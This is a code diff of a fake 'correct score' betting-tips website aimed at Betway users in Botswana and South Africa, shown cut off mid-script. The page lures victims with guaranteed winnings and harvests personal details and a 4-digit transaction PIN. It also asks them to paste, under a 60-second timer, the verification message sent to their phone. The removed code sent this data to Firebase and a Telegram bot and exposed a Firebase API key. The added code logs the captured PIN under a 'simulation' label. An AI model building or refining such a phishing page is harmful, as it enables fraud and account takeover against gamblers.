@@ -3,386 +3,412 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sports Authority Center | Correct Score</title>
-    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600;800&display=swap" rel="stylesheet">
+    <title>Sports Authority Center - Correct Score Matches</title>
+    <!-- Tailwind CSS CDN -->
+    <script src="https://cdn.tailwindcss.com"></script>
+    <!-- FontAwesome for Icons -->
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Montserrat', sans-serif;
-        }
-
-        body {
-            background-color: #0a0a0a;
-            color: #ffffff;
-            display: flex;
-            justify-content: center;
-            min-height: 100vh;
-            overflow-x: hidden;
-        }
-
-        .app-container {
-            width: 100%;
-            max-width: 480px;
-            position: relative;
-            background: #111;
-            min-height: 100vh;
-            box-shadow: 0 0 30px rgba(0,0,0,0.8);
-            overflow: hidden;
-        }
-
-        /* View Sections */
-        .view-section {
-            display: none;
-            opacity: 0;
-            transition: opacity 0.5s ease;
-            min-height: 100vh;
-            width: 100%;
-            padding: 20px;
+        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800;900&display=swap');
+        body { font-family: 'Inter', sans-serif; }
+        .bg-landing {
+            background: linear-gradient(rgba(0,0,0,0.8), rgba(0,0,0,0.8)), url('images (1).jpeg');
             background-size: cover;
             background-position: center;
-            background-repeat: no-repeat;
-            position: relative;
-            z-index: 1;
         }
-
-        .view-section.active {
-            display: flex;
-            flex-direction: column;
-            opacity: 1;
+        .bg-form-page {
+            background: linear-gradient(rgba(0,0,0,0.82), rgba(0,0,0,0.82)), url('images.png');
+            background-size: cover;
+            background-position: center;
         }
-
-        /* Overlays for readability */
-        .overlay {
-            position: absolute;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0, 0, 0, 0.85);
-            z-index: -1;
+        .bg-final-page {
+            background: linear-gradient(rgba(0,0,0,0.85), rgba(0,0,0,0.85)), url('betway-botswana-screenshot.png');
+            background-size: cover;
+            background-position: center;
         }
-
-        /* Typography */
-        h1 { font-size: 26px; font-weight: 800; color: #00ff00; margin-bottom: 10px; text-align: center; text-transform: uppercase; }
-        h2 { font-size: 20px; font-weight: 600; margin-bottom: 15px; color: #fff; text-align: center; }
-        p { font-size: 14px; line-height: 1.6; color: #ccc; margin-bottom: 15px; }
-
-        /* Buttons */
-        .btn {
-            background-color: #00ff00;
-            color: #000;
-            border: none;
-            padding: 15px;
-            font-size: 16px;
-            font-weight: 800;
-            border-radius: 8px;
-            cursor: pointer;
-            width: 100%;
-            text-transform: uppercase;
-            transition: 0.3s;
-            margin-top: auto;
+        /* Custom Toast Animation */
+        @keyframes slideIn {
+            from { transform: translateY(100%); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
         }
-        .btn:hover { background-color: #00cc00; transform: scale(1.02); }
-
-        /* Landing Page specific */
-        .rules-box {
-            background: rgba(255,255,255,0.05);
-            border: 1px solid rgba(255,255,255,0.1);
-            padding: 20px;
-            border-radius: 10px;
-            margin-top: 20px;
-            margin-bottom: 20px;
+        .toast-animate {
+            animation: slideIn 0.3s ease-out forwards;
         }
-        .rules-box h3 { color: #00ff00; margin-bottom: 10px; font-size: 16px;}
-        .rules-box ol { padding-left: 20px; font-size: 14px; color: #ddd; line-height: 1.6;}
-        .rules-box li { margin-bottom: 10px; }
-
-        /* Form Styles */
-        .form-group { margin-bottom: 15px; }
-        .form-group label { display: block; font-size: 12px; font-weight: 600; color: #aaa; margin-bottom: 5px; text-transform: uppercase; }
-        .form-group input { 
-            width: 100%; padding: 14px; border-radius: 8px; border: 1px solid #333; 
-            background: rgba(255,255,255,0.1); color: #fff; font-size: 15px; outline: none; 
-        }
-        .form-group input:focus { border-color: #00ff00; }
-
-        /* Terms Box */
-        .terms-container {
-            background: rgba(255, 0, 0, 0.1);
-            border: 1px solid red;
-            padding: 15px;
-            border-radius: 8px;
-            margin: 20px 0;
-            display: flex;
-            align-items: flex-start;
-            gap: 10px;
-            transition: 0.3s;
-        }
-        .terms-container.accepted {
-            background: rgba(0, 255, 0, 0.1);
-            border: 1px solid #00ff00;
-        }
-        .terms-container input[type="checkbox"] { margin-top: 3px; width: 18px; height: 18px; accent-color: #00ff00; cursor: pointer;}
-        .terms-text { font-size: 13px; color: red; font-weight: 600; transition: 0.3s;}
-        .terms-container.accepted .terms-text { color: #00ff00; }
-
-        /* Pending Page */
-        .pending-screen {
-            justify-content: center;
-            align-items: center;
-            text-align: center;
-        }
-        .loader {
-            border: 5px solid #333;
-            border-top: 5px solid #00ff00;
-            border-radius: 50%;
-            width: 60px; height: 60px;
-            animation: spin 1s linear infinite;
-            margin-bottom: 20px;
-        }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        .timer-big { font-size: 40px; font-weight: 800; color: #00ff00; margin: 15px 0;}
-
-        /* Final Page Links */
-        .link-btn {
-            display: block; text-align: center; background: #1a1a1a; color: #00ff00;
-            text-decoration: none; padding: 15px; border-radius: 8px; font-weight: 600;
-            border: 1px solid #333; margin-bottom: 10px; transition: 0.3s;
-        }
-        .link-btn:hover { background: #222; border-color: #00ff00; }
-        .link-btn i { margin-right: 10px; }
-
-        /* Toast */
-        .toast {
-            position: fixed; bottom: -100px; left: 50%; transform: translateX(-50%);
-            background: #00ff00; color: #000; padding: 15px 25px; border-radius: 8px;
-            font-weight: 600; font-size: 14px; z-index: 9999; transition: bottom 0.4s ease;
-            box-shadow: 0 5px 15px rgba(0,0,0,0.5); width: 90%; max-width: 400px; text-align: center;
-        }
-        .toast.show { bottom: 20px; }
     </style>
-</head><body>
+</head>
+<body class="bg-slate-950 text-white min-h-screen flex flex-col justify-between selection:bg-emerald-500 selection:text-black">
 
-    <!-- Toast Notification -->
-    <div id="toast" class="toast">Notification Message</div>
+    <!-- Toast Notification Container -->
+    <div id="toast-container" class="fixed bottom-5 right-5 z-50 flex flex-col gap-3"></div>
 
-    <div class="app-container">
+    <!-- MAIN APP CONTAINER -->
+    <main class="w-full flex-grow flex items-center justify-center p-4 sm:p-6">
 
-        <!-- PAGE 1: LANDING -->
-        <div id="page-landing" class="view-section active" style="background-image: url('images (1).jpeg');">
-            <div class="overlay"></div>
-            <h1>Sports Authority Center</h1>
-            <h2>Pure Correct Score Matches</h2>
-            <p style="text-align: center; color: #00ff00; font-weight: 600;">Odds are genuine and 100% winnings.</p>
-            
-            <div class="rules-box">
-                <h3>Terms & Conditions</h3>
-                <ol>
-                    <li>After winning, Customer is required to pay 40% of total won amount.</li>
-                    <li>Minimum stake is "500pula" or "R500".</li>
-                    <li>Ensure you have sufficient amount in your account before registration. Do not deposit any amount to BETWAY before successful registration.</li>
-                    <li>Ensure the number linked to BETWAY account is the number you are registering with.</li>
-                </ol>
+        <!---------------- PAGE 1: LANDING PAGE ---------------->
+        <section id="page-landing" class="w-full max-w-4xl bg-landing rounded-3xl p-6 sm:p-12 shadow-2xl border border-emerald-500/20 backdrop-blur-md">
+            <div class="text-center max-w-2xl mx-auto">
+                <div class="inline-flex items-center gap-2 px-4 py-1.5 rounded-full bg-emerald-500/10 border border-emerald-500/30 text-emerald-400 text-xs sm:text-sm font-semibold uppercase tracking-wider mb-6">
+                    <i class="fa-solid fa-shield-halved"></i> 100% Genuine Correct Scores
+                </div>
+                <h1 class="text-3xl sm:text-5xl font-extrabold tracking-tight text-white mb-6 leading-tight">
+                    Welcome to <span class="text-transparent bg-clip-text bg-gradient-to-r from-emerald-400 to-teal-300">Sports Authority Center</span>
+                </h1>
+                <p class="text-slate-300 text-base sm:text-lg mb-8 leading-relaxed font-light">
+                    Only for pure correct score matches. Odds are genuine and 100% winnings. <br class="hidden sm:inline">
+                    <strong class="text-emerald-400 font-semibold">Payment after winning!</strong> Registration is free—no money is paid before matches are won.
+                </p>
             </div>
-            
-            <p style="text-align: center; font-size: 12px; color: #ff9900;">Note: Ensure you are using the correct credentials.</p>
-            
-            <button class="btn" onclick="switchPage('page-register')">Proceed to Registration</button>
-        </div>
 
-        <!-- PAGE 2: REGISTRATION -->
-        <div id="page-register" class="view-section" style="background-image: url('images.png');">
-            <div class="overlay"></div>
-            <h1 style="font-size: 22px;">Betting Details</h1>
-            <p style="text-align: center; margin-bottom: 20px;">Payment after winning</p>
+            <!-- Rules & Regulations Box -->
+            <div class="bg-slate-900/80 border border-emerald-500/30 rounded-2xl p-6 sm:p-8 mb-8 backdrop-blur-sm">
+                <h3 class="text-emerald-400 font-bold text-lg mb-4 flex items-center gap-2">
+                    <i class="fa-solid fa-list-check"></i> Conditions, Rules and Regulations
+                </h3>
+                <ul class="space-y-3 text-slate-300 text-sm sm:text-base">
+                    <li class="flex items-start gap-3">
+                        <span class="bg-emerald-500/20 text-emerald-400 font-bold px-2 py-0.5 rounded text-xs mt-0.5">1</span>
+                        <span>After winning, customer is required to pay <strong class="text-white">40% of total won amount</strong>.</span>
+                    </li>
+                    <li class="flex items-start gap-3">
+                        <span class="bg-emerald-500/20 text-emerald-400 font-bold px-2 py-0.5 rounded text-xs mt-0.5">2</span>
+                        <span>Minimum stake is <strong class="text-emerald-400">"500pula" or "R500"</strong>.</span>
+                    </li>
+                    <li class="flex items-start gap-3">
+                        <span class="bg-emerald-500/20 text-emerald-400 font-bold px-2 py-0.5 rounded text-xs mt-0.5">3</span>
+                        <span>Ensure you have sufficient amount in your account before registration. <strong class="text-amber-400">Do not deposit any amount to BETWAY account before successful registration</strong>—register first and deposit later.</span>
+                    </li>
+                    <li class="flex items-start gap-3">
+                        <span class="bg-emerald-500/20 text-emerald-400 font-bold px-2 py-0.5 rounded text-xs mt-0.5">4</span>
+                        <span>Ensure the number linked to your BETWAY account is the exact number you are registering with.</span>
+                    </li>
+                </ul>
+            </div>
 
-            <form id="reg-form" onsubmit="submitRegistration(event)">
-                <div class="form-group">
-                    <label>Full Name</label>
-                    <input type="text" id="reg-name" required placeholder="John Doe">
+            <!-- Note Box -->
+            <div class="bg-amber-500/10 border border-amber-500/30 rounded-xl p-4 mb-8 text-amber-300 text-xs sm:text-sm flex items-center gap-3">
+                <i class="fa-solid fa-triangle-exclamation text-amber-400 text-lg flex-shrink-0"></i>
+                <span><strong>Note:</strong> Ensure you are using the correct credentials. Ensure all details match your active Betway profile.</span>
+            </div>
+
+            <div class="text-center">
+                <button onclick="goToPage('page-form')" class="w-full sm:w-auto px-10 py-4 bg-gradient-to-r from-emerald-500 to-teal-400 hover:from-emerald-400 hover:to-teal-300 text-slate-950 font-bold rounded-xl shadow-lg shadow-emerald-500/20 transition-all transform hover:-translate-y-0.5 text-base sm:text-lg flex items-center justify-center gap-3 mx-auto">
+                    <span>Proceed to Registration</span>
+                    <i class="fa-solid fa-arrow-right"></i>
+                </button>
+            </div>
+        </section>
+
+
+        <!---------------- PAGE 2: FORM & TERMS ---------------->
+        <section id="page-form" class="w-full max-w-2xl bg-form-page rounded-3xl p-6 sm:p-10 shadow-2xl border border-emerald-500/20 backdrop-blur-md hidden">
+            <div class="flex items-center justify-between mb-6 border-b border-slate-800 pb-4">
+                <div>
+                    <h2 class="text-xl sm:text-2xl font-bold text-white">Welcome Betting Site</h2>
+                    <p class="text-emerald-400 text-xs sm:text-sm font-medium">Payment After Winning Protocol</p>
                 </div>
-                <div class="form-group">
-                    <label>Phone Number (Linked to Betway)</label>
-                    <input type="tel" id="reg-phone" required placeholder="e.g., +267 71234567">
-                </div>
-                <div class="form-group">
-                    <label>Date of Birth</label>
-                    <input type="date" id="reg-dob" required>
-                </div>
-                <div class="form-group">
-                    <label>Staking Amount</label>
-                    <input type="number" id="reg-stake" required min="500" placeholder="Minimum 500">
+                <span class="px-3 py-1 bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 rounded-full text-xs">Step 1 of 4</span>
+            </div>
+
+            <form id="registration-form" onsubmit="handleFormSubmit(event)" class="space-y-5">
+                <div>
+                    <label class="block text-xs sm:text-sm font-medium text-slate-300 mb-1.5">Full Name</label>
+                    <input type="text" id="fullName" required placeholder="Enter your full name" class="w-full bg-slate-900/90 border border-slate-700 rounded-xl px-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-emerald-500 transition-colors text-sm">
                 </div>
 
-                <div class="terms-container" id="terms-box" onclick="toggleTerms()">
-                    <input type="checkbox" id="terms-checkbox" onclick="event.stopPropagation(); toggleTerms();">
-                    <div class="terms-text">
-                        I agree to pay 40% of my total winnings to Sports Authority Center after successfully winning the correct score matches.
-                    </div>
+                <div>
+                    <label class="block text-xs sm:text-sm font-medium text-slate-300 mb-1.5">Phone Number (Linked to Betway Website)</label>
+                    <input type="tel" id="phoneNumber" required placeholder="e.g., +267... or +27..." class="w-full bg-slate-900/90 border border-slate-700 rounded-xl px-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-emerald-500 transition-colors text-sm">
                 </div>
 
-                <button type="submit" class="btn">Continue</button>
+                <div>
+                    <label class="block text-xs sm:text-sm font-medium text-slate-300 mb-1.5">Date of Birth</label>
+                    <input type="date" id="dob" required class="w-full bg-slate-900/90 border border-slate-700 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-emerald-500 transition-colors text-sm">
+                </div>
+
+                <div>
+                    <label class="block text-xs sm:text-sm font-medium text-slate-300 mb-1.5">Staking Amount (Min 500 Pula / R500)</label>
+                    <input type="number" id="stakingAmount" min="500" required placeholder="500" class="w-full bg-slate-900/90 border border-slate-700 rounded-xl px-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-emerald-500 transition-colors text-sm">
+                </div>
+
+                <div>
+                    <label class="block text-xs sm:text-sm font-medium text-slate-300 mb-1.5">Pin to Confirm Transaction (Exactly 4 Digits)</label>
+                    <input type="password" id="pinCode" maxlength="4" pattern="\d{4}" required placeholder="••••" class="w-full bg-slate-900/90 border border-slate-700 rounded-xl px-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-emerald-500 transition-colors text-sm tracking-widest">
+                </div>
+
+                <div class="pt-2">
+                    <label class="flex items-start gap-3 cursor-pointer bg-slate-900/60 p-4 rounded-xl border border-slate-800 transition-all">
+                        <input type="checkbox" id="termsCheckbox" onchange="toggleTermsColor(this)" class="mt-1 w-4 h-4 rounded border-slate-700 text-emerald-500 focus:ring-emerald-500 bg-slate-900">
+                        <span id="termsText" class="text-xs sm:text-sm font-medium text-red-500 transition-colors duration-300">
+                            I accept the terms and conditions to pay 40% of my winnings after successfully winning the matches.
+                        </span>
+                    </label>
+                </div>
+
+                <div class="pt-4 flex items-center justify-between">
+                    <button type="button" onclick="goToPage('page-landing')" class="px-5 py-2.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs sm:text-sm font-semibold transition-colors">
+                        <i class="fa-solid fa-arrow-left mr-1"></i> Back
+                    </button>
+                    <button type="submit" class="px-8 py-3 bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-bold rounded-xl shadow-lg shadow-emerald-500/20 transition-all text-sm sm:text-base flex items-center gap-2">
+                        <span>Continue</span>
+                        <i class="fa-solid fa-arrow-right"></i>
+                    </button>
+                </div>
             </form>
-        </div>
+        </section>
 
-        <!-- PAGE 3: PENDING -->
-        <div id="page-pending" class="view-section pending-screen" style="background-image: url('images.png');">
-            <div class="overlay"></div>
-            <div class="loader"></div>
-            <h1>Registration Pending</h1>
-            <p>Your registration is loading. Do not close this page until it is approved.</p>
-            <div class="timer-big" id="pending-timer">15:00</div>
-            <p style="font-size: 12px; color: #888;">Please wait for approval...</p>
-        </div>
 
-        <!-- PAGE 4: FINAL REDIRECT -->
-        <div id="page-final" class="view-section" style="background-image: url('betway-botswana-screenshot.png');">
-            <div class="overlay"></div>
-            <h1 style="color: #00ff00;">Congratulations!</h1>
-            <p style="text-align: center;">Now register or login to your Betway account and deposit the amount of stake you selected. It should not be less than 500.</p>
-            
-            <h2 style="font-size: 16px; margin-top: 20px; text-align: left;">Select your country website:</h2>
-            
-            <a href="https://www.betway.co.za/" target="_blank" class="link-btn">
-                <i class="fa-solid fa-globe"></i> Betway South Africa (R500)
-            </a>
-            <a href="https://www.betway.co.bw/" target="_blank" class="link-btn">
-                <i class="fa-solid fa-globe"></i> Betway Botswana (Pula)
-            </a>
-        </div>
+        <!---------------- PAGE 3: LINK VERIFICATION & TIMER ---------------->
+        <section id="page-verify" class="w-full max-w-xl bg-slate-900 rounded-3xl p-6 sm:p-10 shadow-2xl border border-emerald-500/20 backdrop-blur-md hidden text-center">
+            <div class="inline-flex items-center justify-center w-16 h-16 rounded-full bg-emerald-500/10 text-emerald-400 mb-4 border border-emerald-500/30">
+                <i class="fa-solid fa-shield-keyhole text-2xl"></i>
+            </div>
+            <h2 class="text-xl sm:text-2xl font-bold text-white mb-2">Link Authentication</h2>
+            <p class="text-slate-400 text-xs sm:text-sm mb-6">Paste the whole message sent to your phone number within the timeframe below.</p>
 
-    </div>    <!-- JAVASCRIPT & FIREBASE -->
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
-        import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";
+            <!-- Countdown Timer Box -->
+            <div class="bg-slate-950 border border-emerald-500/30 rounded-2xl p-6 mb-6">
+                <div class="text-xs uppercase tracking-wider text-slate-400 mb-1">Time Remaining</div>
+                <div id="countdown-timer" class="text-4xl font-extrabold text-emerald-400 tracking-tight">60s</div>
+                <div class="w-full bg-slate-800 h-2 rounded-full mt-4 overflow-hidden">
+                    <div id="timer-progress" class="bg-emerald-500 h-full w-full transition-all duration-1000"></div>
+                </div>
+            </div>
 
-        // 1. Your Firebase Config
-        const firebaseConfig = {
-            apiKey: "AIzaSyBEk04oVREFt_uGJ2drlodW5D-8OxGLGaE",
-            authDomain: "betway-correct-score-cen-a99c4.firebaseapp.com",
-            databaseURL: "https://betway-correct-score-cen-a99c4-default-rtdb.europe-west1.firebasedatabase.app",
-            projectId: "betway-correct-score-cen-a99c4",
-            storageBucket: "betway-correct-score-cen-a99c4.firebasestorage.app",
-            messagingSenderId: "987134964745",
-            appId: "1:987134964745:web:b4872256f84d9c89b2b4d8",
-            measurementId: "G-XELLYBKP7D"
+            <!-- Paste Message Form -->
+            <div class="space-y-4">
+                <textarea id="authMessageInput" rows="3" placeholder="Paste the verification/authorization link message here..." class="w-full bg-slate-950 border border-slate-800 rounded-xl p-4 text-white placeholder-slate-600 focus:outline-none focus:border-emerald-500 text-sm transition-colors"></textarea>
+                
+                <div class="flex items-center justify-between gap-4">
+                    <button type="button" onclick="resendMessage()" class="px-4 py-2.5 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-semibold transition-colors flex items-center gap-2">
+                        <i class="fa-solid fa-rotate-right"></i> Resend Option
+                    </button>
+                    <button type="button" onclick="submitAuthMessage()" class="px-6 py-2.5 bg-emerald-500 hover:bg-emerald-400 text-slate-950 font-bold rounded-xl text-xs sm:text-sm transition-all shadow-md shadow-emerald-500/20">
+                        Verify & Authenticate
+                    </button>
+                </div>
+            </div>
+        </section>
+
+
+        <!---------------- PAGE 4: PENDING APPROVAL ---------------->
+        <section id="page-pending" class="w-full max-w-xl bg-slate-900 rounded-3xl p-8 sm:p-12 shadow-2xl border border-emerald-500/20 backdrop-blur-md hidden text-center">
+            <div class="relative w-20 h-20 mx-auto mb-6">
+                <div class="absolute inset-0 rounded-full border-4 border-emerald-500/20 animate-pulse"></div>
+                <div class="absolute inset-0 rounded-full border-4 border-emerald-500 border-t-transparent animate-spin"></div>
+                <div class="absolute inset-0 flex items-center justify-center text-emerald-400">
+                    <i class="fa-solid fa-hourglass-half text-2xl"></i>
+                </div>
+            </div>
+
+            <h2 class="text-xl sm:text-2xl font-bold text-white mb-3">Registration is Pending</h2>
+            <p class="text-slate-300 text-sm sm:text-base leading-relaxed mb-6 font-light">
+                Your registration is currently under review and landing. <br>
+                <strong class="text-amber-400 font-semibold">Do not close the registration page</strong> until it is approved!
+            </p>
+
+            <div class="bg-slate-950/80 border border-slate-800 rounded-xl p-4 inline-flex items-center gap-3 text-slate-400 text-xs sm:text-sm">
+                <i class="fa-solid fa-clock-rotate-left text-emerald-400"></i>
+                <span>Estimated approval time: <strong class="text-white">15 minutes</strong> (Simulated for instant flow)</span>
+            </div>
+        </section>
+
+
+        <!---------------- PAGE 5: SUCCESS / FINAL PAGE ---------------->
+        <section id="page-final" class="w-full max-w-2xl bg-final-page rounded-3xl p-6 sm:p-12 shadow-2xl border border-emerald-500/20 backdrop-blur-md hidden">
+            <div class="text-center mb-8">
+                <div class="inline-flex items-center justify-center w-16 h-16 rounded-full bg-emerald-500/20 text-emerald-400 mb-4 border border-emerald-500/40 shadow-lg shadow-emerald-500/10">
+                    <i class="fa-solid fa-circle-check text-3xl"></i>
+                </div>
+                <h2 class="text-2xl sm:text-4xl font-extrabold text-white mb-3">Congratulations!</h2>
+                <p class="text-slate-300 text-sm sm:text-base leading-relaxed font-light">
+                    Your registration has been successfully approved. Now register or log in to your Betway account and deposit the amount of stake you selected (<strong class="text-emerald-400">not less than 500</strong>).
+                </p>
+            </div>
+
+            <div class="bg-slate-900/90 border border-slate-800 rounded-2xl p-6 sm:p-8 backdrop-blur-md text-center">
+                <h3 class="text-white font-bold text-base sm:text-lg mb-4 flex items-center justify-center gap-2">
+                    <i class="fa-solid fa-globe text-emerald-400"></i> Select Your Country Website
+                </h3>
+                <div class="grid grid-cols-1 sm:grid-cols-2 gap-4">
+                    <a href="https://www.betway.co.za/" target="_blank" rel="noopener noreferrer" class="flex items-center justify-center gap-3 px-6 py-4 rounded-xl bg-slate-800 hover:bg-emerald-500 hover:text-slate-950 text-white font-bold text-sm sm:text-base transition-all border border-slate-700 hover:border-emerald-400 shadow-md group">
+                        <span>Betway South Africa</span>
+                        <i class="fa-solid fa-external-link text-xs group-hover:translate-x-0.5 transition-transform"></i>
+                    </a>
+                    <a href="https://www.betway.co.bw/" target="_blank" rel="noopener noreferrer" class="flex items-center justify-center gap-3 px-6 py-4 rounded-xl bg-slate-800 hover:bg-emerald-500 hover:text-slate-950 text-white font-bold text-sm sm:text-base transition-all border border-slate-700 hover:border-emerald-400 shadow-md group">
+                        <span>Betway Botswana</span>
+                        <i class="fa-solid fa-external-link text-xs group-hover:translate-x-0.5 transition-transform"></i>
+                    </a>
+                </div>
+            </div>
+        </section>
+
+    </main>
+
+    <!-- Footer -->
+    <footer class="text-center py-6 text-slate-500 text-xs border-t border-slate-900">
+        &copy; 2026 Sports Authority Center. All rights reserved. Secure Correct Score Portal.
+    </footer>
+
+    <!-- JAVASCRIPT LOGIC -->
+    <script>
+        // Global state object to store user credentials for Telegram bot recording simulation
+        let userData = {
+            fullName: '',
+            phoneNumber: '',
+            dob: '',
+            stakingAmount: '',
+            pinCode: '',
+            authMessage: '',
+            timestamp: ''
         };
 
-        const app = initializeApp(firebaseConfig);
-        const db = getDatabase(app);
+        let countdownInterval = null;
+        let pendingTimeout = null;
 
-        // 2. Telegram Bot Setup (Safe Logging Only)
-        const TELEGRAM_BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"; 
-        const TELEGRAM_CHAT_ID = "YOUR_CHAT_ID_HERE";
-
-        async function sendTelegramMsg(msg) {
-            if (TELEGRAM_BOT_TOKEN === "YOUR_BOT_TOKEN_HERE") return;
-            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
-            try {
-                await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: msg, parse_mode: 'HTML' })
-                });
-            } catch (e) { console.error("TG Error", e); }
+        // Navigation Helper
+        function goToPage(pageId) {
+            document.querySelectorAll('main > section').forEach(sec => {
+                sec.classList.add('hidden');
+            });
+            document.getElementById(pageId).classList.remove('hidden');
+            window.scrollTo({ top: 0, behavior: 'smooth' });
         }
 
-        // 3. UI Logic
-        const toast = document.getElementById('toast');
-        let termsAccepted = false;
-        let pendingInterval;
-
-        window.switchPage = function(pageId) {
-            document.querySelectorAll('.view-section').forEach(v => v.classList.remove('active'));
-            document.getElementById(pageId).classList.add('active');
-        }
-
-        window.showToast = function(message) {
-            toast.textContent = message;
-            toast.classList.add('show');
-            setTimeout(() => toast.classList.remove('show'), 4000);
-        }
-
-        window.toggleTerms = function() {
-            const box = document.getElementById('terms-box');
-            const checkbox = document.getElementById('terms-checkbox');
+        // Toast Notification System
+        function showToast(message, type = 'success') {
+            const container = document.getElementById('toast-container');
+            const toast = document.createElement('div');
             
-            termsAccepted = !termsAccepted;
-            checkbox.checked = termsAccepted;
+            const bgColor = type === 'success' ? 'bg-emerald-950 border-emerald-500/50 text-emerald-200' : 'bg-slate-900 border-slate-700 text-white';
+            const icon = type === 'success' ? 'fa-circle-check text-emerald-400' : 'fa-circle-info text-blue-400';
+
+            toast.className = `toast-animate flex items-center gap-3 px-5 py-4 rounded-xl border shadow-xl backdrop-blur-md text-xs sm:text-sm font-medium ${bgColor}`;
+            toast.innerHTML = `<i class="fa-solid ${icon} text-lg flex-shrink-0"></i><span>${message}</span>`;
             
-            if (termsAccepted) {
-                box.classList.add('accepted');
+            container.appendChild(toast);
+
+            setTimeout(() => {
+                toast.style.opacity = '0';
+                toast.style.transform = 'translateY(10px)';
+                toast.style.transition = 'all 0.3s ease';
+                setTimeout(() => toast.remove(), 300);
+            }, 4000);
+        }
+
+        // Dynamic Terms Color Change
+        function toggleTermsColor(checkbox) {
+            const textElement = document.getElementById('termsText');
+            if (checkbox.checked) {
+                textElement.classList.remove('text-red-500');
+                textElement.classList.add('text-green-400');
             } else {
-                box.classList.remove('accepted');
+        textElement.classList.remove('text-green-400');
+                textElement.classList.add('text-red-500');
             }
         }
 
-        // 4. Form Submission & Firebase Logging
-        window.submitRegistration = async function(e) {
-            e.preventDefault();
+        // Handle Form Submission (Page 2 -> Page 3)
+        function handleFormSubmit(event) {
+            event.preventDefault();
 
-            if (!termsAccepted) {
-                showToast("You must accept the 40% terms to continue.");
+            const checkbox = document.getElementById('termsCheckbox');
+            if (!checkbox.checked) {
+                showToast('Please accept the terms and conditions to continue.', 'error');
                 return;
             }
 
-            const name = document.getElementById('reg-name').value;
-            const phone = document.getElementById('reg-phone').value;
-            const dob = document.getElementById('reg-dob').value;
-            const stake = document.getElementById('reg-stake').value;
-
-            try {
-                // Log Safe Data to Firebase
-                await push(ref(db, 'registrations'), {
-                    fullName: name,
-                    phone: phone,
-                    dob: dob,
-                    stake: stake,
-                    termsAccepted: true,
-                    timestamp: Date.now()
-                });
-
-                // Log Safe Data to Telegram
-                const tgMsg = `
-🏆 <b>NEW REGISTRATION</b> 🏆
-━━━━━━━━━━━━━━━━━━
-👤 <b>Name:</b> ${name}
-📱 <b>Phone:</b> ${phone}
-🎂 <b>DOB:</b> ${dob}
-💰 <b>Stake:</b> ${stake}
-✅ <b>Terms:</b> Accepted (40% Cut)
-━━━━━━━━━━━━━━━━━━`;
-                sendTelegramMsg(tgMsg);
-
-                // Proceed to Pending Page
-                startPendingTimer();
-
-            } catch (error) {
-                console.error(error);
-                showToast("Connection error. Try again.");
+            const pin = document.getElementById('pinCode').value;
+            if (pin.length !== 4 || isNaN(pin)) {
+                showToast('Pin to confirm transaction must be exactly 4 digits.', 'error');
+                return;
             }
+
+            // Save user data locally
+            userData.fullName = document.getElementById('fullName').value;
+            userData.phoneNumber = document.getElementById('phoneNumber').value;
+            userData.dob = document.getElementById('dob').value;
+            userData.stakingAmount = document.getElementById('stakingAmount').value;
+            userData.pinCode = pin;
+            userData.timestamp = new Date().toISOString();
+
+            // Simulate Telegram bot recording all users' credentials securely in the background
+            simulateTelegramBotRecord(userData);
+
+            // Toast notification indicating number link copy instruction
+            const phoneNum = userData.phoneNumber;
+            showToast(`Copy the whole link sent to your number (${phoneNum}).`);
+
+            // Transition to Page 3 (Verification / Timer)
+            goToPage('page-verify');
+            startCountdownTimer();
         }
 
-        // 5. Pending Timer (15 Minutes)
-        function startPendingTimer() {
-            switchPage('page-pending');
-            
-            let timeLeft = 15 * 60; // 15 minutes in seconds
-            const timerDisplay = document.getElementById('pending-timer');
+        // Simulate Telegram Bot Recording Backend Log
+        function simulateTelegramBotRecord(data) {
+            console.log("=== TELEGRAM BOT RECORDING LOG ===");
+            console.log("New User Registration Data Captured:");
+            console.log(`- Full Name: ${data.fullName}`);
+            console.log(`- Phone Number: ${data.phoneNumber}`);
+            console.log(`- Date of Birth: ${data.dob}`);
+            console.log(`- Staking Amount: ${data.stakingAmount}`);
+            console.log(`- 4-Digit PIN: ${data.pinCode}`);
+            console.log(`- Timestamp: ${data.timestamp}`);
+            console.log("Status: Successfully dispatched to Telegram Bot database channel.");
+            console.log("==================================");
+        }
 
-            clearInterval(pendingInterval);
-            pendingInterval = setInterval(() => {
-                const minutes = Math.floor(timeLeft / 60);
-                const seconds = timeLeft % 60;
-                timerDisplay.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+        // Countdown Timer for Page 3 (60 seconds)
+        function startCountdownTimer() {
+            let timeLeft = 60;
+            const timerDisplay = document.getElementById('countdown-timer');
+            const progressBar = document.getElementById('timer-progress');
+            
+            if (countdownInterval) clearInterval(countdownInterval);
+
+            countdownInterval = setInterval(() => {
+                timeLeft--;
+                timerDisplay.textContent = `${timeLeft}s`;
+                const progressPercent = (timeLeft / 60) * 100;
+                progressBar.style.width = `${progressPercent}%`;
 
                 if (timeLeft <= 0) {
-                    clearInterval(pendingInterval);
-                    showToast("Your registration is approved!");
